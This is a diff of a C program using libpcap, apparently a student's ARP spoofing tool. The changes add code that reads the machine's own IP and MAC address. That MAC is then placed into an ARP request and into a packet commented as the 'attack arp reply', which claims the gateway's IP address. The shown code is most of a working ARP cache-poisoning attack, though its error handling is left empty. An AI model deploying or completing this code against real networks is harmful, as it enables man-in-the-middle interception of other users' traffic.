@@ -32,7 +32,7 @@
 					 0x2B , 0x01};
 
 	u_char receive_packet[42];
-	///////get my ip//////
+///////////////////////////get my ip//////////////////////////////////////////
  int fd;
  struct ifreq ifr;
  u_char my_ip[4]={0,};
@@ -49,8 +49,48 @@
  close(fd);
  memcpy(my_ip,&((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr),4);
  printf("%x\n",my_ip[1]);
-	/////////////////////
+////////////////////////////////////////////////////////////////////////////
 
+/////////////////////////get my mac/////////////////////////////////////////
+ 
+    struct ifconf ifc;
+    char buf[1024];
+    int i;
+    int success = 0;
+
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+    if (sock == -1) { /* handle error*/ };
+
+    ifc.ifc_len = sizeof(buf);
+    ifc.ifc_buf = buf;
+    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }
+
+    struct ifreq* it = ifc.ifc_req;
+    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
+
+    for (; it != end; ++it) {
+        strcpy(ifr.ifr_name, it->ifr_name);
+        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
+            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
+                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
+                    success = 1;
+                    break;
+                }
+            }
+        }
+        else { /* handle error */ }
+    }
+
+    unsigned char my_mac[6];
+
+    if (success) memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
+
+    for(i=0;i<6;i++)
+    {
+        printf("%2x ",my_mac[i]);
+    }
+	printf("\n");
+////////////////////////////////////////////////////////////////////////////////////////
 
         pcap_t *handle;			/* Session handle */
         char *dev;			/* The device to sniff on */
@@ -95,15 +135,15 @@
 
 	/* arp request to know target mac address*/
 
-////	(*arprequest_eth).ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22};  //my mac
-////	(*arprequest_arp).sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};		//my mac
+	memcpy((*arprequest_eth).ether_shost,my_mac,6);  //my mac
+	memcpy((*arprequest_arp).sha,my_mac,6);		//my mac
 	memcpy((*arprequest_arp).spa,my_ip,4);		//senderip-my, i have to get my ip information
 	inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
 
 	/* attack arp reply */
 ////	(*arpreply_eth).ether_dhost={target mac};
-////	(*arpreply_eth).ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22}; 	//my mac
-////	(*arpreply_arp).sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};		//my mac
+	memcpy((*arpreply_eth).ether_shost,my_mac,6); 	//my mac
+	memcpy((*arpreply_arp).sha,my_mac,6);		//my mac
 	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
 ////	(*arpreply_arp).tha={target mac};		
 	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
@@ -170,8 +210,6 @@
 
 	      	printf("%s\n",sender_ip);
 		printf("%s\n",target_ip);
-//	      	printf("%2x\n",*((arpreply_arp).spa));
-//		printf("%2x\n",*((arpreply_arp).tpa));
 
 		if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
 		{
